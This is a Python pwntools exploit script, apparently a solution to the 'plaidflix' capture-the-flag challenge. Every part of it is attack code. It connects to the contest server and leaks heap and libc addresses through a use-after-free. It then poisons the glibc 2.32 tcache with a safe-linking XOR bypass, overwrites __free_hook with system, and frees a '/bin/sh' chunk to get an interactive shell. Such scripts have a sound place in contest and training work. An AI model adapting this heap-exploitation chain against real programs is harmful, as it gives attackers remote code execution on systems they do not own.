from pwn import *

context.terminal = ['gnome-terminal','-x','sh','-c']
#context.log_level = logging.DEBUG

io = remote('plaidflix.pwni.ng',1337)
#io = process('plaidflix')
libc = ELF('../libc-2.32.so')
#0x100 chunk
def add_feedback(data):

    io.recvuntil('> ')
    io.sendline('0')
    io.recvuntil('us?')
    io.sendline(data)

def del_feedback(idx):

    io.recvuntil('> ')
    io.sendline('1')
    io.recvuntil('delete?')
    io.sendline(str(idx))

def add_contact(data):

    io.recvuntil('> ')
    io.sendline('2')
    io.recvuntil('questions?')
    io.sendline(data)

def add_movie(title,star):
    io.recvuntil('> ')
    io.sendline('0')  
    io.recvuntil('> ')
    io.sendline('0')
    io.recvuntil('want to add?')
    io.sendline(title)
    io.recvuntil('?')
    io.sendline(str(star))

def show_movie():
    io.recvuntil('> ')
    io.sendline('0')  
    io.recvuntil('> ')
    io.sendline('2')

def del_movie(idx):
    io.recvuntil('> ')
    io.sendline('0')  
    io.recvuntil('> ')
    io.sendline('1')
    io.recvuntil('remove?')
    io.sendline(str(idx))

def share(moive_idx,fri_idx):
    io.recvuntil('> ')
    io.sendline('0')  
    io.recvuntil('> ')   
    io.sendline('3')
    io.recvuntil('share?')
    io.sendline(str(moive_idx))
    io.recvuntil('one?')
    io.sendline(str(fri_idx))

def add_friend(size,name):
    io.recvuntil('> ')
    io.sendline('1')  
    io.recvuntil('> ')
    io.sendline('0')
    io.recvuntil('name?')
    io.sendline(str(size))
    io.recvuntil('name?')
    io.sendline(name)

def del_friend(idx):
    io.recvuntil('> ')
    io.sendline('1')  
    io.recvuntil('> ')
    io.sendline('1')   
    io.recvuntil('anymore?')
    io.sendline(str(idx))

def show_friend():
    io.recvuntil('> ')
    io.sendline('1')  
    io.recvuntil('> ')
    io.sendline('2')

off = 0x00007f7715723c80 - 0x7f7715540000

io.recvuntil('name?')
io.sendline('ydh')
#add_feedback('aaa)

for i in range(8):
    print(i)
    add_friend(0x80-1,'a')

add_movie('movie 0',1)
add_movie('movie 1',1)
share(0,0)
share(1,7)
del_friend(0)
show_movie()
io.recvuntil('with: ')
L = u64(io.recv(5).ljust(8,b'\x00'))
print(hex(L<<12))
[del_friend(i+1) for i in range(7)]
add_friend(0x90-1,'a')
show_movie()
io.recvuntil('with: ')
io.recvuntil('with: ')
libc_base = u64(io.recv(6).ljust(8,b'\x00'))-off
print(hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
print(hex(free_hook))
sys = libc_base + libc.sym['system']

io.recvuntil('> ')
io.sendline('2')
io.recvuntil('account? (y/N)')
io.sendline('y')

[add_feedback('/bin/sh') for i in range(10)] #0~9
[del_feedback(i) for i in range(5)] #0~4
del_feedback(8)
del_feedback(7)
del_feedback(6)
del_feedback(5)
add_feedback('/bin/sh')#0
add_feedback('/bin/sh')#1
del_feedback(6)
add_contact(b'a'*0x108+p64(0x111)+p64(free_hook^L))
add_feedback('/bin/sh')
add_feedback(p64(sys))

io.interactive()
